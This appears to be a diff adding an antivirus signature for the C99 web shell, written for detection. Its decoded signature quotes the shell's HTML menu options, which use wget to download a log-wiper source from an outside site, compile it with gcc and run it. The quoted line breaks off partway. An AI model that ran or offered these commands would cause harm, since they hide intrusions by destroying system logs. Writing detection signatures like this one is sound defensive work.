@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.C99-12
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+<option value="wget http://packetstormsecurity.org/unix/penetration/log-wipers/logcleaner-0.3.c">wipelogs (part 1)(zap3) <option value="gcc logcleaner-0.3.c -o logcleaner-0.3">wipelogs (part 2)(zap3) <option value="./logcleaner-0.3
